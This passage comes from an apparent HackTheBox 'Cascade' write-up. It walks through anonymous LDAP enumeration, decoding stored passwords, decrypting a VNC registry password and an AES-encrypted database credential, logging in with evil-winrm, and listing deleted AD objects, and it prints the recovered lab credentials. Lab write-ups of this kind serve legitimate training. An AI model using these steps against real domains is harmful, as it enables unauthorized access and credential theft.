[+] Account Lockout Threshold: None\n        [+] Forced Log off Time: Not Set\n\n[+]  Getting local group memberships:            \nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\krbtgt    \nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Controllers\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Schema Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Enterprise Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Cert Publishers\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Domain Admins\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Group Policy Creator Owners\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\\Read-only Domain Controllers\nGroup: HR' (RID: 1115) has member: CASCADE\\s.hickson\nGroup: Data Share' (RID: 1138) has member: CASCADE\\Domain Users\nGroup: Audit Share' (RID: 1137) has member: CASCADE\\s.smith\nGroup: Remote Management Users' (RID: 1126) has member: CASCADE\\arksvc\nGroup: Remote Management Users' (RID: 1126) has member: CASCADE\\s.smith\nGroup: AD Recycle Bin' (RID: 1119) has member: CASCADE\\arksvc\nGroup: IT' (RID: 1113) has member: CASCADE\\arksvc\nGroup: IT' (RID: 1113) has member: CASCADE\\s.smith\nGroup: IT' (RID: 1113) has member: CASCADE\\r.thompson\n\n[+]  Getting domain group memberships:        \nGroup: 'Domain Guests' (RID: 514) has member: CASCADE\\CascGuest\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\administrator\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\krbtgt\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\arksvc\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\s.smith\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\r.thompson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\util\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.wakefield\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\s.hickson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.goodhand\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\a.turnbull\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\e.crowe\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\b.hanson\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\d.burman\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\BackupSvc\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\j.allen\nGroup: 'Domain Users' (RID: 513) has member: CASCADE\\i.croft\nGroup: 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\\administrator\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#via-anonymous-logon","title":"via anonymous logon","text":"<p><pre><code>smbclient -N -L cascade.htb\n</code></pre> even though anonymous login was succesful, no shares were found: <pre><code>Anonymous login successful\n\nSharename       Type      Comment\n---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to cascade.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre> since we have no creds, we cant move forward with smb, we could try other services like ldap.</p>"},{"location":"ch3ckm8_HTB_Cascade/#ldap-enumeration","title":"LDAP enumeration","text":"<p>get naming context <pre><code>ldapsearch -LLL -x -H ldap://cascade.htb -s base namingcontexts \n</code></pre></p> <p><pre><code>dn:\nnamingContexts: DC=cascade,DC=local\nnamingContexts: CN=Configuration,DC=cascade,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local\nnamingContexts: DC=DomainDnsZones,DC=cascade,DC=local\nnamingContexts: DC=ForestDnsZones,DC=cascade,DC=local\n</code></pre> here the naming context is <code>DC=cascade,DC=local</code></p>"},{"location":"ch3ckm8_HTB_Cascade/#gather-all-users-optional","title":"Gather all users (optional)","text":"<p><pre><code>ldapsearch -LLL -x -H ldap://cascade.htb -b \"DC=cascade,DC=local\" \"objectclass=user\" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt\n</code></pre> users.txt: <pre><code>CascGuest\nCASC-DC1$\narksvc\ns.smith\nr.thompson\nutil\nj.wakefield\ns.hickson\nj.goodhand\na.turnbull\ne.crowe\nb.hanson\nd.burman\nBackupSvc\nj.allen\ni.croft\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#check-if-anonymous-login-is-allowed","title":"check if anonymous login is allowed","text":"<p><pre><code>ldapsearch -LLL -x -H ldap://cascade.htb -b \"DC=cascade,DC=local\"\n</code></pre> i got a full list of users objects etc, so that means that anonymous bind is enabled</p> <p>by inspecting the output, i noticed that user <code>r.thompson</code> has this field and value: <pre><code>cascadeLegacyPwd: clk0bjVldmE=\n</code></pre> which in base64 is: <pre><code>echo 'clk0bjVldmE=' | base64 -d\n</code></pre> so now it seems we have a password for user <code>r.thompson</code> <pre><code>rY4n5eva\n</code></pre></p> <p>For future reference, keep in mind to check for fields that contain <code>pwd</code> as substring in their name , like the one above (cascadeLegacyPwd) inside the output of <code>ldapsearch</code>.</p> <p>The gathered creds here was: <pre><code>r.thompson\nrY4n5eva\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Cascade/#checking-access-to-services","title":"Checking access to services","text":"<p>lets now try to check to which service's we can connect with those creds, using my automated nxc script https://github.com/ch3ckkm8/auto_netexec <pre><code>./auto_netexec_bulk_creds_checker.sh cascade.htb 'r.thompson' 'rY4n5eva'\n</code></pre></p> <p><pre><code>[*] Checking if winrm port 5985 is open on cascade.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nWINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\\r.thompson:rY4n5eva\n\n[*] Checking if smb port 445 is open on cascade.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\\r.thompson:rY4n5eva \n\n[*] Checking if ldap port 389 is open on cascade.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.182    389    CASC-DC1         [+] cascade.local\\r.thompson:rY4n5eva \n\n[*] Checking if rdp port 3389 is open on cascade.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on cascade.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.10.10.182    135    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nRPC         10.10.10.182    135    CASC-DC1         [+] cascade.local\\r.thompson:rY4n5eva \n\n[*] Checking if nfs port 2049 is open on cascade.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on cascade.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on cascade.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on cascade.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on cascade.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> so we can login to smb, lets try connecting as <code>r.thompson</code></p>"},{"location":"ch3ckm8_HTB_Cascade/#smb-login-via-rthompson","title":"SMB login via <code>r.thompson</code>","text":"<pre><code>smbclient -L cascade.htb -U r.thompson%rY4n5eva\n</code></pre> <p><pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nAudit$          Disk      \nC$              Disk      Default share\nData            Disk      \nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nprint$          Disk      Printer Drivers\nSYSVOL          Disk      Logon server share \n</code></pre> hm, there are shares like <code>Data</code> that are not the default systemic ones, lets start from there</p>"},{"location":"ch3ckm8_HTB_Cascade/#downloading-and-inspecting-the-smb-shares","title":"Downloading and inspecting the SMB shares","text":"<p>this will recursively list the shares we have access <pre><code>smbclient //cascade.htb/Data -U r.thompson%rY4n5eva -c 'recurse;ls'\n</code></pre></p> <pre><code> .                                   D        0  Sun Jan 26 22:27:34 2020\n  ..                                  D        0  Sun Jan 26 22:27:34 2020\n  Contractors                         D        0  Sun Jan 12 20:45:11 2020\n  Finance                             D        0  Sun Jan 12 20:45:06 2020\n  IT                                  D        0  Tue Jan 28 13:04:51 2020\n  Production                          D        0  Sun Jan 12 20:45:18 2020\n  Temps                               D        0  Sun Jan 12 20:45:15 2020\n\n\\Contractors\nNT_STATUS_ACCESS_DENIED listing \\Contractors\\*\n\n\\Finance\nNT_STATUS_ACCESS_DENIED listing \\Finance\\*\n\n\\IT\n  .                                   D        0  Tue Jan 28 13:04:51 2020\n  ..                                  D        0  Tue Jan 28 13:04:51 2020\n  Email Archives                      D        0  Tue Jan 28 13:00:30 2020\n  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020\n  Logs                                D        0  Tue Jan 28 19:53:04 2020\n  Temp                                D        0  Tue Jan 28 17:06:59 2020\n\n\\Production\nNT_STATUS_ACCESS_DENIED listing \\Production\\*\n\n\\Temps\nNT_STATUS_ACCESS_DENIED listing \\Temps\\*\n\n\\IT\\Email Archives\n  .                                   D        0  Tue Jan 28 13:00:30 2020\n  ..                                  D        0  Tue Jan 28 13:00:30 2020\n  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 13:00:12 2020\n\\IT\\LogonAudit\n  .                                   D        0  Tue Jan 28 13:04:40 2020\n  ..                                  D        0  Tue Jan 28 13:04:40 2020\n\\IT\\Logs\n  .                                   D        0  Tue Jan 28 19:53:04 2020\n  ..                                  D        0  Tue Jan 28 19:53:04 2020\n  Ark AD Recycle Bin                  D        0  Fri Jan 10 11:33:45 2020\n  DCs                                 D        0  Tue Jan 28 19:56:00 2020\n\\IT\\Temp\n  .                                   D        0  Tue Jan 28 17:06:59 2020\n  ..                                  D        0  Tue Jan 28 17:06:59 2020\n  r.thompson                          D        0  Tue Jan 28 17:06:53 2020\n  s.smith                             D        0  Tue Jan 28 15:00:01 2020\n\\IT\\Logs\\Ark AD Recycle Bin\n  .                                   D        0  Fri Jan 10 11:33:45 2020\n  ..                                  D        0  Fri Jan 10 11:33:45 2020\n  ArkAdRecycleBin.log                 A     1303  Tue Jan 28 20:19:11 2020\n\\IT\\Logs\\DCs\n  .                                   D        0  Tue Jan 28 19:56:00 2020\n  ..                                  D        0  Tue Jan 28 19:56:00 2020\n  dcdiag.log                          A     5967  Fri Jan 10 11:17:30 2020\n\\IT\\Temp\\r.thompson\n  .                                   D        0  Tue Jan 28 17:06:53 2020\n  ..                                  D        0  Tue Jan 28 17:06:53 2020\n\\IT\\Temp\\s.smith\n  .                                   D        0  Tue Jan 28 15:00:01 2020\n  ..                                  D        0  Tue Jan 28 15:00:01 2020\n  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020\n</code></pre> <p>that works, but for our convenience, we can download all the contents of /Data share locally: <pre><code>smbclient '//cascade.htb/Data' -N -c 'prompt OFF;recurse ON;cd '//cascade.htb/Data';lcd '/root/HTB/cascade/smb_shares/';mget *' -U r.thompson%rY4n5eva\n</code></pre></p> <p>on the <code>/IT/Email Archives/Meeting_Notes_June_2018.html</code> i found this: <pre><code>From: Steve Smith \n- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). \n- The winner of the \u201cBest GPO\u201d competition will be announced on Friday so get your submissions in soon.\n</code></pre> so we have the sender steve smith and a temp user <pre><code>Steve Smith\nTempAdmin\n</code></pre> (it also mentioned gpo, which is an existent domain group, we will keep that in mind for later, if it )</p>"},{"location":"ch3ckm8_HTB_Cascade/#decrypting-encrypted-text","title":"Decrypting encrypted text","text":"<p>since this info seems insufficient to move forward, i searched more, and inspected this file: <code>IT/Temp/s.smith/VNC Install.reg</code> on <code>s.smith</code> folder <pre><code>\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f\n</code></pre> decoding it to text: <pre><code>6bcf2a4b6e5aca0f -&gt; k\u00cf*KnZ\u00ca\u000f\n</code></pre> Appears sth unreadable, might be encrypted.</p> <p>The filename indicates VNC related file, lets find more info about it: <code>A .reg file, or registry file, is\u00a0==a text file used to modify the Windows Registry==.\u00a0It can be used to automate VNC (Virtual Network Computing) installations by adding registry keys and values, including settings like the VNC password, connection options, and other configurations.\u00a0These files simplify the process of configuring VNC, especially when deploying it to multiple machines.</code> and also found this: <code>\"Password\"=hex:xx,xx,xx,xx ; Replace with your base64 encoded password</code></p> <p>and based on this: https://github.com/frizb/PasswordDecrypts i decrypted it, using native linux tools: <pre><code>echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\n</code></pre></p> <p><pre><code>00000000  73 54 33 33 33 76 65 32                           |sT333ve2|\n00000008\n</code></pre> so it seems that this password is <code>sT333ve2</code>, and since it was inside the <code>s.smith</code> folder, the new creds we obtained are: <pre><code>s.smith\nsT333ve2\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#logging-in-as-ssmith","title":"Logging in as <code>s.smith</code>","text":"<p>Lets check again with nxc (via my automated script) towards what services we can login with those creds: https://github.com/ch3ckkm8/auto_netexec <pre><code>./auto_netexec_bulk_creds_checker.sh cascade.htb 's.smith' 'sT333ve2'\n</code></pre></p> <p><pre><code>[*] Checking if winrm port 5985 is open on cascade.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nWINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\\s.smith:sT333ve2 (Pwn3d!)\n\n[*] Checking if smb port 445 is open on cascade.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\\s.smith:sT333ve2 \n\n[*] Checking if ldap port 389 is open on cascade.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.182    389    CASC-DC1         [+] cascade.local\\s.smith:sT333ve2 \n\n[*] Checking if rdp port 3389 is open on cascade.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on cascade.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.10.10.182    135    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nRPC         10.10.10.182    135    CASC-DC1         [+] cascade.local\\s.smith:sT333ve2 \n\n[*] Checking if nfs port 2049 is open on cascade.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on cascade.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on cascade.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on cascade.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on cascade.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> great! according to the output above, it seems we can login in via win-rm <pre><code>evil-winrm -i cascade.htb -u 's.smith' -p 'sT333ve2'\n</code></pre> logged in succesfully and grabbed the user flag <pre><code>cac743f518f998d53ce20a3e24e45756\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_Cascade/#bloodhound","title":"BloodHound","text":"<p><pre><code>bloodhound-python -u 's.smith' -p 'sT333ve2'  -d cascade.htb -ns 10.10.10.182 -c All --zip\n</code></pre> it did not work, so lets try to find info from the inside</p>"},{"location":"ch3ckm8_HTB_Cascade/#group-membership-of-user-ssmith","title":"Group membership of user <code>s.smith</code>","text":"<pre><code>net user s.smith\n</code></pre> <p><pre><code>User name                    s.smith\nFull Name                    Steve Smith\nComment\nUser's comment\nCountry code                 000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            1/28/2020 8:58:05 PM\nPassword expires             Never\nPassword changeable          1/28/2020 8:58:05 PM\nPassword required            Yes\nUser may change password     No\n\nWorkstations allowed         All\nLogon script                 MapAuditDrive.vbs\nUser profile\nHome directory\nLast logon                   1/29/2020 12:26:39 AM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Audit Share          *IT\n                             *Remote Management Use\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n</code></pre> hm <code>Audit Share</code> is not a common micsoroft group, lets inspect it first:</p>"},{"location":"ch3ckm8_HTB_Cascade/#local-group-details","title":"Local group details","text":"<pre><code>net localgroup \"Audit Share\"\n</code></pre> <p><pre><code>Alias name     Audit Share\nComment        \\\\Casc-DC1\\Audit$\n\nMembers\n\n-------------------------------------------------------------------------------\ns.smith\nThe command completed successfully.\n</code></pre> The comment <code>\\\\Casc-DC1\\Audit$</code> is useful, we can now see what does this share contain by browsing through the directories:  <pre><code>*Evil-WinRM* PS C:\\Shares\\audit&gt; ls\n\nDirectory: C:\\Shares\\audit\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        1/28/2020   9:40 PM                DB\nd-----        1/26/2020  10:25 PM                x64\nd-----        1/26/2020  10:25 PM                x86\n-a----        1/28/2020   9:46 PM          13312 CascAudit.exe\n-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll\n-a----        1/28/2020  11:29 PM             45 RunAudit.bat\n-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll\n-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll\n</code></pre></p> <p>lets find them also through smbclient: <pre><code>smbclient -L cascade.htb -U s.smith%sT333ve2\n</code></pre> we want to download the <code>Audit$</code> share according to our previous findings <pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nAudit$          Disk      \nC$              Disk      Default share\nData            Disk      \nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nprint$          Disk      Printer Drivers\nSYSVOL          Disk      Logon server share \n</code></pre></p> <p>Downloading the whole folder on my machine: <pre><code>smbclient '//cascade.htb/Audit$' -N -c 'prompt OFF;recurse ON;cd '//Casc-DC1/Audit$';lcd '/root/HTB/cascade/smb_shares_casc-dc1/';mget *' -U s.smith%sT333ve2\n</code></pre></p> <pre><code>tree                                                                                    \n.\n\u251c\u2500\u2500 CascAudit.exe\n\u251c\u2500\u2500 CascCrypto.dll\n\u251c\u2500\u2500 DB\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Audit.db\n\u251c\u2500\u2500 RunAudit.bat\n\u251c\u2500\u2500 System.Data.SQLite.dll\n\u251c\u2500\u2500 System.Data.SQLite.EF6.dll\n\u251c\u2500\u2500 x64\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 SQLite.Interop.dll\n\u2514\u2500\u2500 x86\n    \u2514\u2500\u2500 SQLite.Interop.dll\n\n4 directories, 8 files\n</code></pre>"},{"location":"ch3ckm8_HTB_Cascade/#viewing-files-contained-inside-the-share","title":"Viewing files contained inside the share","text":"<p>the one that at first glance stands out to me obviously, is the <code>.db</code> file, lets view it: <pre><code>sqlite3 DB/Audit.db .dump\n</code></pre></p> <p><pre><code>PRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE IF NOT EXISTS \"Ldap\" (\n        \"Id\"    INTEGER PRIMARY KEY AUTOINCREMENT,\n        \"uname\" TEXT,\n        \"pwd\"   TEXT,\n        \"domain\"        TEXT\n);\nINSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');\nCREATE TABLE IF NOT EXISTS \"Misc\" (\n        \"Id\"    INTEGER PRIMARY KEY AUTOINCREMENT,\n        \"Ext1\"  TEXT,\n        \"Ext2\"  TEXT\n);\nCREATE TABLE IF NOT EXISTS \"DeletedUserAudit\" (\n        \"Id\"    INTEGER PRIMARY KEY AUTOINCREMENT,\n        \"Username\"      TEXT,\n        \"Name\"  TEXT,\n        \"DistinguishedName\"     TEXT\n);\nINSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\\n',char(10)),'CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');\nINSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\\n',char(10)),'CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');\nINSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\\n',char(10)),'CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');\nDELETE FROM sqlite_sequence;\nINSERT INTO sqlite_sequence VALUES('Ldap',2);\nINSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);\nCOMMIT;\n</code></pre> i can see a value in this line though, that seems like base64: <code>BQO5l5Kj9MdErXx6Q6AGOw==</code> <pre><code>INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');\n</code></pre> decoding it, provides sth unreadable/encrypted <pre><code>echo \"BQO5l5Kj9MdErXx6Q6AGOw==\" | base64 -d\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdD\ufffd|zC\ufffd;\n</code></pre></p> <p>I did not find anything obvious about it, so i had to check the rest of the files. The goal here is to find the source code, that will reveal the way to decrypt this encrypted text.</p>"},{"location":"ch3ckm8_HTB_Cascade/#debugging-the-app","title":"Debugging the app","text":"<p>For this matter, i downloaded jetbrains DotPeek, and opened <code>CascCrypto.dll</code>, then viewed this function:  The source code for the DecryptString and EncryptString functions is: <pre><code>// Decompiled with JetBrains decompiler\n// Type: CascCrypto.Crypto\n// Assembly: CascCrypto, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\n// MVID: 91D4F672-E937-4DE4-9B7F-86B055322985\nusing System;\nusing System.IO;\nusing System.Security.Cryptography;\nusing System.Text;\n\n#nullable disable\nnamespace CascCrypto;\n\npublic class Crypto\n{\n  public const string DefaultIV = \"1tdyjCbY1Ix49842\";\n  public const int Keysize = 128 /*0x80*/;\n\n  public static string EncryptString(string Plaintext, string Key)\n  {\n    byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);\n    Aes aes = Aes.Create();\n    aes.BlockSize = 128 /*0x80*/;\n    aes.KeySize = 128 /*0x80*/;\n    aes.IV = Encoding.UTF8.GetBytes(\"1tdyjCbY1Ix49842\");\n    aes.Key = Encoding.UTF8.GetBytes(Key);\n    aes.Mode = CipherMode.CBC;\n    using (MemoryStream memoryStream = new MemoryStream())\n    {\n      using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))\n      {\n        cryptoStream.Write(bytes, 0, bytes.Length);\n        cryptoStream.FlushFinalBlock();\n      }\n      return Convert.ToBase64String(memoryStream.ToArray());\n    }\n  }\n\n  public static string DecryptString(string EncryptedString, string Key)\n  {\n    byte[] buffer = Convert.FromBase64String(EncryptedString);\n    Aes aes = Aes.Create();\n    aes.KeySize = 128 /*0x80*/;\n    aes.BlockSize = 128 /*0x80*/;\n    aes.IV = Encoding.UTF8.GetBytes(\"1tdyjCbY1Ix49842\");\n    aes.Mode = CipherMode.CBC;\n    aes.Key = Encoding.UTF8.GetBytes(Key);\n    using (MemoryStream memoryStream = new MemoryStream(buffer))\n    {\n      using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))\n      {\n        byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];\n        cryptoStream.Read(numArray, 0, numArray.Length);\n        return Encoding.UTF8.GetString(numArray);\n      }\n    }\n  }\n}\n</code></pre> What i noticed here, was that both encryption and decryption used this <code>IV</code>: <code>1tdyjCbY1Ix49842</code> I also observed from the source code above that it uses <code>aes</code> encryption.  The last thing we need to find, is the key that is passed as parameter on those functions, for this part, we need to examine the <code>CascAudit.exe</code>.</p> <p>By opening it again via DotPeek, my goal was to find the <code>main function</code>, and later i found the part where <code>public static void Main()</code> is:  It seems that <code>DecryptString</code> is called there, and the parameter (key) is <code>c4scadek3y654321</code></p> <p>So the whole encryption specs are: - <code>AES</code> - <code>CBC</code> mode - block &amp; key size = <code>128</code> - IV= <code>1tdyjCbY1Ix49842</code> - key= <code>c4scadek3y654321</code> - <code>UTF-8</code> encoding</p>"},{"location":"ch3ckm8_HTB_Cascade/#reverse-the-encryption-process","title":"Reverse the encryption process","text":"<p>So knowing all these, lets get in cyberchef in order to reverse the encryption process (decrypt), by providing what we already know:  so the decrypted pass now is: <pre><code>w3lc0meFr31nd\n</code></pre></p> <p>great, we decrypted this encrypted text, remember this was inserted as value along with the user <code>ArkSvc</code> in the <code>Audit.db</code> file.  <pre><code>INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');\n</code></pre> So its safe to assume that it corresponds to <code>ArkSvc</code>, lets try logging in via win-rm, the creds are: <pre><code>ArkSvc\nw3lc0meFr31nd\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Cascade/#logging-in-as-arksvc","title":"Logging in as <code>ArkSvc</code>","text":"<p><pre><code>evil-winrm -i cascade.htb -u 'ArkSvc' -p 'w3lc0meFr31nd'\n</code></pre> successfully logged in, but it seems that we are not done here, we cant access the admin directory.</p> <p>tried running bloodhound <pre><code>bloodhound-python -u 'ArkSvc' -p 'w3lc0meFr31nd'  -d cascade.htb -ns 10.10.10.182 -c All --zip\n</code></pre> but again it does not work, lets find the info we need from the inside.</p>"},{"location":"ch3ckm8_HTB_Cascade/#group-membership-of-arksvc","title":"Group membership of ArkSvc","text":"<pre><code>net user ArkSvc\n</code></pre> <p><pre><code>User name                    arksvc\nFull Name                    ArkSvc\nComment\nUser's comment\nCountry code                 000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            1/9/2020 5:18:20 PM\nPassword expires             Never\nPassword changeable          1/9/2020 5:18:20 PM\nPassword required            Yes\nUser may change password     No\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   1/29/2020 10:05:40 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *AD Recycle Bin       *IT\n                             *Remote Management Use\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n</code></pre> Very interesting, local group membership reveals that this user is member of <code>AD Recycle Bin</code> group, how can we take advantage of it though?</p>"},{"location":"ch3ckm8_HTB_Cascade/#retrieving-deleted-objects-from-recycle-bin","title":"Retrieving deleted objects from Recycle Bin","text":"<p>Using hacktricks: https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md i found this command below: <pre><code>#You need to be in the \"AD Recycle Bin\" group of the AD to list the deleted AD objects\nGet-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *\n</code></pre> we get all the deleted objects, lets inspect them. <pre><code>CanonicalName                   : cascade.local/Deleted Objects\nCN                              : Deleted Objects\nCreated                         : 1/9/2020 3:31:39 PM\ncreateTimeStamp                 : 1/9/2020 3:31:39 PM\nDeleted                         : True\nDescription                     : Default container for deleted objects\nDisplayName                     :\nDistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local\ndSCorePropagationData           : {1/1/1601 12:00:00 AM}\ninstanceType                    : 4\nisCriticalSystemObject          : True\nisDeleted                       : True\nLastKnownParent                 :\nModified                        : 1/13/2020 1:21:17 AM\nmodifyTimeStamp                 : 1/13/2020 1:21:17 AM\nName                            : Deleted Objects\nObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local\nObjectClass                     : container\nObjectGUID                      : 51de9801-3625-4ac2-a605-d6bd71617681\nProtectedFromAccidentalDeletion :\nsDRightsEffective               : 0\nshowInAdvancedViewOnly          : True\nsystemFlags                     : -1946157056\nuSNChanged                      : 65585\nuSNCreated                      : 5695\nwhenChanged                     : 1/13/2020 1:21:17 AM\nwhenCreated                     : 1/9/2020 3:31:39 PM\n\naccountExpires                  : 9223372036854775807\nbadPasswordTime                 : 0\nbadPwdCount                     : 0\nCanonicalName                   : cascade.local/Deleted Objects/CASC-WS1\n                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe\nCN                              : CASC-WS1\n                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe\ncodePage                        : 0\ncountryCode          